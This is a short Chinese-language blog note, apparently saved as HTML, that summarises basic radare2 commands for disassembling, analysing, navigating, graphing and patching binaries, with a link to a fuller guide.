-<p>指令格式<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[.][<span class="built_in">times</span>][cmd][~grep][@[@iter]addr!size][|&gt;pipe] ;</span><br></pre></td></tr></table></figure><br>显示某一个指令的帮助<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令?</span><br></pre></td></tr></table></figure><br>从当前位置打印十六进制<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">px</span><br></pre></td></tr></table></figure><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">px @ main <span class="comment"># 表示从main开始执行px，main也可以是地址</span></span><br></pre></td></tr></table></figure><br>a进行分析，aaa进行完整分析，aaaa添加实验性特性<br>pdf打印函数代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdf @ main <span class="comment"># 打印main函数的代码，main也可以是某个地址</span></span><br></pre></td></tr></table></figure><br>radare2没识别的函数可以用af来识别<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">af @ addr </span><br></pre></td></tr></table></figure><br>s用于跳转到指定位置</p>
-<p>pd用于打印汇编信息</p>
-<p>pdc可以用于查看反编译代码</p>
-<h3 id="VV进入图形化模式"><a href="#VV进入图形化模式" class="headerlink" title="VV进入图形化模式"></a>VV进入图形化模式</h3><p>?用于显示帮助信息</p>
-<p>可以发现键位是类似于vim的</p>
-<p>p/P切换图形模式的显示模式</p>
-<p>:输入命令，hjkl移动图形</p>
-<p>!在调试时很有用，显示了各种信息</p>
-<p>空格切换图形/文本模式</p>
-<p>文本模式下可以用p来切换视图</p>
-<h4 id="r2patch程序"><a href="#r2patch程序" class="headerlink" title="r2patch程序"></a>r2patch程序</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r2 -w bin <span class="comment"># 以可写模式载入bin文件，或者r2内使用e io.cache=true</span></span><br></pre></td></tr></table></figure>
-<p>w系列用于patch文件</p>
-<ul>
-<li>wa可以用于使用汇编指令patch文件，wa?查看帮助</li>
-<li>wx用于十六进制patch</li>
-</ul>
-<p>可视化patch<br>Vp,然后输入A就可以patch了</p>
-<p>输入/ 用于搜索</p>
-<p>ax用于管理交叉引用，/r 用于搜索</p>
-<p>文档说$可以反编译，我没有= =</p>
-<blockquote>
-<p>另外可以使用esil语言模拟执行</p>
-</blockquote>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/1514/">Radare2使用全解</a></p>
 
       
     </div>
